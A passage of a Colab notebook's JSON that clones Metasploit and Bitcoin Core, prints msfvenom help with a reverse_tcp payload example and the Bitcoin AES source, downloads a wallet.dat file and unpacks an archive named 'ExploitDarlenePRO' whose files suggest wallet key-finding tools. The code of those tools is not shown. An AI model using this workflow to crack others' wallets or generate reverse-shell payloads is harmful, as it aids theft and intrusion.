      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cXGg-zhYghpU",
        "outputId": "68ad6ed2-dd10-4400-9f78-8d5e6978697f"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching base58-0.2.3.gem\n",
            "Successfully installed base58-0.2.3\n",
            "Parsing documentation for base58-0.2.3\n",
            "Installing ri documentation for base58-0.2.3\n",
            "Done installing documentation for base58 after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install crypto"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cnrpX_2zgj_O",
        "outputId": "2f534e9d-aef5-419a-fb22-5e8f5f184f24"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching crypto-0.0.3.gem\n",
            "\n",
            "Successfully installed crypto-0.0.3\n",
            "Parsing documentation for crypto-0.0.3\n",
            "Installing ri documentation for crypto-0.0.3\n",
            "Done installing documentation for crypto after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install config-hash -v 0.9.0"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yPgdAplQgmnQ",
        "outputId": "958abd9e-14df-4026-f358-8b6c266159b9"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching config-hash-0.9.0.gem\n",
            "Successfully installed config-hash-0.9.0\n",
            "Parsing documentation for config-hash-0.9.0\n",
            "Installing ri documentation for config-hash-0.9.0\n",
            "Done installing documentation for config-hash after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/rapid7/metasploit-framework.git"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "osDZUMTbgpqt",
        "outputId": "e8893df7-d3fe-409e-f70b-dd15f7200815"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'metasploit-framework'...\n",
            "remote: Enumerating objects: 699085, done.\u001b[K\n",
            "remote: Counting objects: 100% (7772/7772), done.\u001b[K\n",
            "remote: Compressing objects: 100% (1753/1753), done.\u001b[K\n",
            "remote: Total 699085 (delta 6050), reused 7326 (delta 5707), pack-reused 691313 (from 1)\u001b[K\n",
            "Receiving objects: 100% (699085/699085), 1.00 GiB | 23.57 MiB/s, done.\n",
            "Resolving deltas: 100% (519031/519031), done.\n",
            "Updating files: 100% (13526/13526), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "GOKYEsVzg44O",
        "outputId": "aba54521-0352-4dd9-ff47-9603ed8c1b19"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mmetasploit-framework\u001b[0m/  \u001b[01;34msample_data\u001b[0m/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qzuxbJgnhHW6",
        "outputId": "283aba5a-c83c-46df-efca-118620c6a39f"
      },
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5nRVMjIWhJj6",
        "outputId": "e784d897-0851-40ac-bf32-71143bf686b0"
      },
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                         docker-compose.yml     LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md           Dockerfile             metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/                      \u001b[01;34mdocs\u001b[0m/                  \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md              \u001b[01;34mdocumentation\u001b[0m/         \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING                      \u001b[01;34mexternal\u001b[0m/              \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml                  Gemfile                \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md                   Gemfile.local.example  msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/                        Gemfile.lock           \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                          \u001b[01;34mkubernetes\u001b[0m/            \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/                      \u001b[01;34mlib\u001b[0m/                   \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n",
            "docker-compose.override.yml  LICENSE                \u001b[01;32mmsfvenom\u001b[0m*\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./msfvenom -help"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NRYZEbbNhLyM",
        "outputId": "44d293b5-93b9-4b47-89df-7506070ea46a"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "MsfVenom - a Metasploit standalone payload generator.\n",
            "Also a replacement for msfpayload and msfencode.\n",
            "Usage: ./msfvenom [options] <var=val>\n",
            "Example: ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe\n",
            "\n",
            "Options:\n",
            "    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all\n",
            "    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom\n",
            "        --list-options               List --payload <value>'s standard, advanced and evasion options\n",
            "    -f, --format          <format>   Output format (use --list formats to list)\n",
            "    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)\n",
            "        --service-name    <value>    The service name to use when generating a service binary\n",
            "        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string\n",
            "        --smallest                   Generate the smallest possible payload using all available encoders\n",
            "        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)\n",
            "        --encrypt-key     <value>    A key to be used for --encrypt\n",
            "        --encrypt-iv      <value>    An initialization vector for --encrypt\n",
            "    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)\n",
            "        --platform        <platform> The platform for --payload (use --list platforms to list)\n",
            "    -o, --out             <path>     Save the payload to a file\n",
            "    -b, --bad-chars       <list>     Characters to avoid example: '\\x00\\xff'\n",
            "    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload\n",
            "        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)\n",
            "    -s, --space           <length>   The maximum size of the resulting payload\n",
            "        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)\n",
            "    -i, --iterations      <count>    The number of times to encode the payload\n",
            "    -c, --add-code        <path>     Specify an additional win32 shellcode file to include\n",
            "    -x, --template        <path>     Specify a custom executable file to use as a template\n",
            "    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread\n",
            "    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats\n",
            "    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)\n",
            "    -h, --help                       Show this message\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/bitcoin/bitcoin.git"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6WLz_9MqhOUn",
        "outputId": "68e2821a-dc96-47d8-fd7d-16c047bd7908"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'bitcoin'...\n",
            "remote: Enumerating objects: 291854, done.\u001b[K\n",
            "remote: Counting objects: 100% (319/319), done.\u001b[K\n",
            "remote: Compressing objects: 100% (240/240), done.\u001b[K\n",
            "remote: Total 291854 (delta 183), reused 133 (delta 77), pack-reused 291535 (from 1)\u001b[K\n",
            "Receiving objects: 100% (291854/291854), 266.35 MiB | 19.90 MiB/s, done.\n",
            "Resolving deltas: 100% (210786/210786), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QJileFWlhTlD",
        "outputId": "c353532a-701a-45ba-d60e-8766aff60bfb"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd bitcoin/src/crypto/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "VskRayMVhVix",
        "outputId": "3360f157-0c33-4e12-a983-3d68d37fcf87"
      },
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework/bitcoin/src/crypto\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LceUP0d6hW1w",
        "outputId": "32410ef9-fca9-4042-868a-8cb8709d57d0"
      },
      "execution_count": 16,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "aes.cpp               \u001b[0m\u001b[01;34mctaes\u001b[0m/              hmac_sha512.h  sha1.h                sha3.cpp\n",
            "aes.h                 hex_base.cpp        muhash.cpp     sha256_arm_shani.cpp  sha3.h\n",
            "chacha20.cpp          hex_base.h          muhash.h       sha256_avx2.cpp       sha512.cpp\n",
            "chacha20.h            hkdf_sha256_32.cpp  poly1305.cpp   sha256.cpp            sha512.h\n",
            "chacha20poly1305.cpp  hkdf_sha256_32.h    poly1305.h     sha256.h              siphash.cpp\n",
            "chacha20poly1305.h    hmac_sha256.cpp     ripemd160.cpp  sha256_sse41.cpp      siphash.h\n",
            "CMakeLists.txt        hmac_sha256.h       ripemd160.h    sha256_sse4.cpp\n",
            "common.h              hmac_sha512.cpp     sha1.cpp       sha256_x86_shani.cpp\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cat aes.cpp"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "EZny-8ERhYXl",
        "outputId": "6071f021-d65b-4d35-d40e-9bfdddac72e9"
      },
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "// Copyright (c) 2016-2019 The Bitcoin Core developers\n",
            "// Distributed under the MIT software license, see the accompanying\n",
            "// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n",
            "\n",
            "#include <crypto/aes.h>\n",
            "\n",
            "#include <string.h>\n",
            "\n",
            "extern \"C\" {\n",
            "#include <crypto/ctaes/ctaes.c>\n",
            "}\n",
            "\n",
            "AES256Encrypt::AES256Encrypt(const unsigned char key[32])\n",
            "{\n",
            "    AES256_init(&ctx, key);\n",
            "}\n",
            "\n",
            "AES256Encrypt::~AES256Encrypt()\n",
            "{\n",
            "    memset(&ctx, 0, sizeof(ctx));\n",
            "}\n",
            "\n",
            "void AES256Encrypt::Encrypt(unsigned char ciphertext[16], const unsigned char plaintext[16]) const\n",
            "{\n",
            "    AES256_encrypt(&ctx, 1, ciphertext, plaintext);\n",
            "}\n",
            "\n",
            "AES256Decrypt::AES256Decrypt(const unsigned char key[32])\n",
            "{\n",
            "    AES256_init(&ctx, key);\n",
            "}\n",
            "\n",
            "AES256Decrypt::~AES256Decrypt()\n",
            "{\n",
            "    memset(&ctx, 0, sizeof(ctx));\n",
            "}\n",
            "\n",
            "void AES256Decrypt::Decrypt(unsigned char plaintext[16], const unsigned char ciphertext[16]) const\n",
            "{\n",
            "    AES256_decrypt(&ctx, 1, plaintext, ciphertext);\n",
            "}\n",
            "\n",
            "\n",
            "template <typename T>\n",
            "static int CBCEncrypt(const T& enc, const unsigned char iv[AES_BLOCKSIZE], const unsigned char* data, int size, bool pad, unsigned char* out)\n",
            "{\n",
            "    int written = 0;\n",
            "    int padsize = size % AES_BLOCKSIZE;\n",
            "    unsigned char mixed[AES_BLOCKSIZE];\n",
            "\n",
            "    if (!data || !size || !out)\n",
            "        return 0;\n",
            "\n",
            "    if (!pad && padsize != 0)\n",
            "        return 0;\n",
            "\n",
            "    memcpy(mixed, iv, AES_BLOCKSIZE);\n",
            "\n",
            "    // Write all but the last block\n",
            "    while (written + AES_BLOCKSIZE <= size) {\n",
            "        for (int i = 0; i != AES_BLOCKSIZE; i++)\n",
            "            mixed[i] ^= *data++;\n",
            "        enc.Encrypt(out + written, mixed);\n",
            "        memcpy(mixed, out + written, AES_BLOCKSIZE);\n",
            "        written += AES_BLOCKSIZE;\n",
            "    }\n",
            "    if (pad) {\n",
            "        // For all that remains, pad each byte with the value of the remaining\n",
            "        // space. If there is none, pad by a full block.\n",
            "        for (int i = 0; i != padsize; i++)\n",
            "            mixed[i] ^= *data++;\n",
            "        for (int i = padsize; i != AES_BLOCKSIZE; i++)\n",
            "            mixed[i] ^= AES_BLOCKSIZE - padsize;\n",
            "        enc.Encrypt(out + written, mixed);\n",
            "        written += AES_BLOCKSIZE;\n",
            "    }\n",
            "    return written;\n",
            "}\n",
            "\n",
            "template <typename T>\n",
            "static int CBCDecrypt(const T& dec, const unsigned char iv[AES_BLOCKSIZE], const unsigned char* data, int size, bool pad, unsigned char* out)\n",
            "{\n",
            "    int written = 0;\n",
            "    bool fail = false;\n",
            "    const unsigned char* prev = iv;\n",
            "\n",
            "    if (!data || !size || !out)\n",
            "        return 0;\n",
            "\n",
            "    if (size % AES_BLOCKSIZE != 0)\n",
            "        return 0;\n",
            "\n",
            "    // Decrypt all data. Padding will be checked in the output.\n",
            "    while (written != size) {\n",
            "        dec.Decrypt(out, data + written);\n",
            "        for (int i = 0; i != AES_BLOCKSIZE; i++)\n",
            "            *out++ ^= prev[i];\n",
            "        prev = data + written;\n",
            "        written += AES_BLOCKSIZE;\n",
            "    }\n",
            "\n",
            "    // When decrypting padding, attempt to run in constant-time\n",
            "    if (pad) {\n",
            "        // If used, padding size is the value of the last decrypted byte. For\n",
            "        // it to be valid, It must be between 1 and AES_BLOCKSIZE.\n",
            "        unsigned char padsize = *--out;\n",
            "        fail = !padsize | (padsize > AES_BLOCKSIZE);\n",
            "\n",
            "        // If not well-formed, treat it as though there's no padding.\n",
            "        padsize *= !fail;\n",
            "\n",
            "        // All padding must equal the last byte otherwise it's not well-formed\n",
            "        for (int i = AES_BLOCKSIZE; i != 0; i--)\n",
            "            fail |= ((i > AES_BLOCKSIZE - padsize) & (*out-- != padsize));\n",
            "\n",
            "        written -= padsize;\n",
            "    }\n",
            "    return written * !fail;\n",
            "}\n",
            "\n",
            "AES256CBCEncrypt::AES256CBCEncrypt(const unsigned char key[AES256_KEYSIZE], const unsigned char ivIn[AES_BLOCKSIZE], bool padIn)\n",
            "    : enc(key), pad(padIn)\n",
            "{\n",
            "    memcpy(iv, ivIn, AES_BLOCKSIZE);\n",
            "}\n",
            "\n",
            "int AES256CBCEncrypt::Encrypt(const unsigned char* data, int size, unsigned char* out) const\n",
            "{\n",
            "    return CBCEncrypt(enc, iv, data, size, pad, out);\n",
            "}\n",
            "\n",
            "AES256CBCEncrypt::~AES256CBCEncrypt()\n",
            "{\n",
            "    memset(iv, 0, sizeof(iv));\n",
            "}\n",
            "\n",
            "AES256CBCDecrypt::AES256CBCDecrypt(const unsigned char key[AES256_KEYSIZE], const unsigned char ivIn[AES_BLOCKSIZE], bool padIn)\n",
            "    : dec(key), pad(padIn)\n",
            "{\n",
            "    memcpy(iv, ivIn, AES_BLOCKSIZE);\n",
            "}\n",
            "\n",
            "\n",
            "int AES256CBCDecrypt::Decrypt(const unsigned char* data, int size, unsigned char* out) const\n",
            "{\n",
            "    return CBCDecrypt(dec, iv, data, size, pad, out);\n",
            "}\n",
            "\n",
            "AES256CBCDecrypt::~AES256CBCDecrypt()\n",
            "{\n",
            "    memset(iv, 0, sizeof(iv));\n",
            "}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://github.com/Fedu1ov/BoB/blob/9ace45b896a62451a15f66228b89ff66a5e31dd1/wallet.dat"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CAL0riH0hahA",
        "outputId": "355384b3-2c4d-4999-8597-48f5f39f6f40"
      },
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2024-11-16 19:49:31--  https://github.com/Fedu1ov/BoB/blob/9ace45b896a62451a15f66228b89ff66a5e31dd1/wallet.dat\n",
            "Resolving github.com (github.com)... 140.82.112.3\n",
            "Connecting to github.com (github.com)|140.82.112.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: unspecified [text/html]\n",
            "Saving to: ‘wallet.dat’\n",
            "\n",
            "wallet.dat              [ <=>                ] 281.92K  --.-KB/s    in 0.1s    \n",
            "\n",
            "2024-11-16 19:49:32 (2.71 MB/s) - ‘wallet.dat’ saved [288688]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AAeM3u95hcwh",
        "outputId": "a1fb1268-b296-4e2a-d837-58965b383ad4"
      },
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "aes.cpp               \u001b[0m\u001b[01;34mctaes\u001b[0m/              hmac_sha512.h  sha1.h                sha3.cpp\n",
            "aes.h                 hex_base.cpp        muhash.cpp     sha256_arm_shani.cpp  sha3.h\n",
            "chacha20.cpp          hex_base.h          muhash.h       sha256_avx2.cpp       sha512.cpp\n",
            "chacha20.h            hkdf_sha256_32.cpp  poly1305.cpp   sha256.cpp            sha512.h\n",
            "chacha20poly1305.cpp  hkdf_sha256_32.h    poly1305.h     sha256.h              siphash.cpp\n",
            "chacha20poly1305.h    hmac_sha256.cpp     ripemd160.cpp  sha256_sse41.cpp      siphash.h\n",
            "CMakeLists.txt        hmac_sha256.h       ripemd160.h    sha256_sse4.cpp       wallet.dat\n",
            "common.h              hmac_sha512.cpp     sha1.cpp       sha256_x86_shani.cpp\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd /"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MJuZkFUmhj5c",
        "outputId": "6f86eecd-6e04-4dad-a19f-08eb5d15aeb6"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd content/metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lgwNwkNnhlQs",
        "outputId": "a3acb967-bf8e-49c2-a705-9938ee8c76b7"
      },
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xSYd2S1Whn40",
        "outputId": "50d69b92-6e65-4a12-d606-4a256542981f"
      },
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd modules/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AXnaMdT7hqna",
        "outputId": "4526145a-5a2a-4bfb-d624-306dc9715f49"
      },
      "execution_count": 23,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework/modules\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "F_i7OJD4h5Sf",
        "outputId": "10609865-b281-4491-b026-4b1be0b6df1f"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mauxiliary\u001b[0m/  \u001b[01;34mencoders\u001b[0m/  \u001b[01;34mevasion\u001b[0m/  \u001b[01;34mexploits\u001b[0m/  \u001b[01;34mnops\u001b[0m/  \u001b[01;34mpayloads\u001b[0m/  \u001b[01;34mpost\u001b[0m/  README.md\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd exploits/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gi9hHSR4h7Gr",
        "outputId": "dd741568-278a-4761-dfd2-aa6080e263b1"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework/modules/exploits\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "x8MHVXvPh-mm",
        "outputId": "aa1374f5-a706-4e2d-e3fd-070f98e0526f"
      },
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34maix\u001b[0m/        \u001b[01;34mbsdi\u001b[0m/                      example.rb         \u001b[01;34mhpux\u001b[0m/       \u001b[01;34mmulti\u001b[0m/    \u001b[01;34mqnx\u001b[0m/\n",
            "\u001b[01;34mandroid\u001b[0m/    \u001b[01;34mdialup\u001b[0m/                    example_webapp.rb  \u001b[01;34mirix\u001b[0m/       \u001b[01;34mnetware\u001b[0m/  \u001b[01;34msolaris\u001b[0m/\n",
            "\u001b[01;34mapple_ios\u001b[0m/  example_linux_priv_esc.rb  \u001b[01;34mfirefox\u001b[0m/           \u001b[01;34mlinux\u001b[0m/      \u001b[01;34mopenbsd\u001b[0m/  \u001b[01;34munix\u001b[0m/\n",
            "\u001b[01;34mbsd\u001b[0m/        \u001b[01;32mexample.py\u001b[0m*                \u001b[01;34mfreebsd\u001b[0m/           \u001b[01;34mmainframe\u001b[0m/  \u001b[01;34mosx\u001b[0m/      \u001b[01;34mwindows\u001b[0m/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!unzip ExploitDarlenePRO.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "7f6iPjjNif_y",
        "outputId": "89fd9f66-5356-4c10-999a-12990fde6734"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archive:  ExploitDarlenePRO.zip\n",
            "  inflating: blockchain_api_grabber.rb  \n",
            "  inflating: config.rb               \n",
            "  inflating: decode_core.rb          \n",
            "  inflating: extract_number.rb       \n",
            "  inflating: injection_database.rb   \n",
            "  inflating: key_finder.rb           \n",
            "  inflating: main.rb                 \n",
            "  inflating: model_nn.rb             \n",
            "  inflating: seed_mt_unit.rb         \n",
            "  inflating: simplistic_approach.rb  \n",
            "  inflating: vulnerability_scanner.rb  \n",
            "  inflating: wallet_crossentropy.rb  \n",
            "   creating: ExploitDarlenePRO/\n",
            "  inflating: ExploitDarlenePRO/blockchain_api_grabber.rb  \n",
            "  inflating: ExploitDarlenePRO/config.rb  \n",
            "  inflating: ExploitDarlenePRO/decode_core.rb  \n",
            "  inflating: ExploitDarlenePRO/extract_number.rb  \n",
            "  inflating: ExploitDarlenePRO/injection_database.rb  \n",
            "  inflating: ExploitDarlenePRO/key_finder.rb  \n",
            "  inflating: ExploitDarlenePRO/main.rb  \n",
            "  inflating: ExploitDarlenePRO/model_nn.rb  \n",
            "  inflating: ExploitDarlenePRO/seed_mt_unit.rb  \n",
            "  inflating: ExploitDarlenePRO/simplistic_approach.rb  \n",
            "  inflating: ExploitDarlenePRO/vulnerability_scanner.rb  \n",
            "  inflating: ExploitDarlenePRO/wallet_crossentropy.rb  \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jaRM7ZOsihQa",
        "outputId": "4c464b69-4cc4-4425-8bcc-4072ff2b1a75"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34maix\u001b[0m/                       \u001b[01;32mexample.py\u001b[0m*            \u001b[01;34mirix\u001b[0m/          \u001b[01;34mqnx\u001b[0m/\n",
            "\u001b[01;34mandroid\u001b[0m/                   example.rb             key_finder.rb  seed_mt_unit.rb\n",
            "\u001b[01;34mapple_ios\u001b[0m/                 example_webapp.rb      \u001b[01;34mlinux\u001b[0m/         simplistic_approach.rb\n",
            "blockchain_api_grabber.rb  \u001b[01;34mExploitDarlenePRO\u001b[0m/     \u001b[01;34mmainframe\u001b[0m/     \u001b[01;34msolaris\u001b[0m/\n",
            "\u001b[01;34mbsd\u001b[0m/                       ExploitDarlenePRO.zip  main.rb        \u001b[01;34munix\u001b[0m/\n",
            "\u001b[01;34mbsdi\u001b[0m/                      extract_number.rb      model_nn.rb    vulnerability_scanner.rb\n",
            "config.rb                  \u001b[01;34mfirefox\u001b[0m/               \u001b[01;34mmulti\u001b[0m/         wallet_crossentropy.rb\n",
